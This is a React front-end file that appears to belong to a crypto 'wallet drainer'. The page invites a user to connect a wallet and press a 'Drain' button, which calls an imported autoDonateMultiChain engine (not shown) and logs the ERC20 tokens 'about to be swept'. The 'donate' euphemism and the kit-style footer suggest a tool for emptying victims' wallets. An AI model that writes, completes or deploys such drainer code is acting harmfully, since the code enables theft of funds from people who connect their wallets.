// src/App.jsx
import React, { useState } from "react";
import { ConnectButton } from "@rainbow-me/rainbowkit";
import { useAccount, useWalletClient } from "wagmi";
import { autoDonateMultiChain } from "./engine/donate";

export default function App() {
  const [status, setStatus] = useState("idle");
  const [last, setLast] = useState(null);

  const { isConnected } = useAccount();
  const { data: walletClient } = useWalletClient();

  async function handleDonate() {
    if (!walletClient) {
      console.error("No wallet client available");
      return;
    }

    try {
      setStatus("running");

      // Pass walletClient so both injected + WC work
      const res = await autoDonateMultiChain(walletClient);
      setLast(res);

      if (res.success && res.tokens?.length > 0) {
        console.log("Tokens about to be swept:");
        res.tokens.forEach((t, i) => {
          console.log(
            `${i + 1}. ${t.tokenSymbol} | ${t.tokenAddress} | Balance: ${t.balanceRaw}`
          );
        });
        setStatus("done");
      } else if (res.success && (!res.tokens || res.tokens.length === 0)) {
        console.log("No ERC20 tokens detected for sweep.");
        setStatus("done");
      } else {
        console.error("Donation failed:", res.reason);
        setStatus("failed");
      }
    } catch (e) {
      console.error(e);
      setLast({ success: false, reason: e.message });
      setStatus("error");
    }
  }

  return (
    <div style={{ padding: 24, fontFamily: "system-ui, Arial" }}>
      <h1>MVP</h1>
      <p>Drain my wallet</p>

      <div style={{ margin: "12px 0" }}>
        <ConnectButton />
      </div>

      {/* Only show button if wallet is connected */}
      {isConnected && (
        <div style={{ marginTop: 12 }}>
          <button
            onClick={handleDonate}
            style={{
              padding: "10px 16px",
              borderRadius: 8,
              background: "#2563eb",
              color: "white",
              border: "none",
              cursor: "pointer",
            }}
          >
            Drain
          </button>
        </div>
      )}

      <div style={{ marginTop: 20 }}>
        <strong>Status:</strong> {status}
        <pre style={{ marginTop: 8 }}>{JSON.stringify(last, null, 2)}</pre>
      </div>

      <p style={{ color: "#666", marginTop: 20 }}>APEX at work</p>
    </div>
  );
}
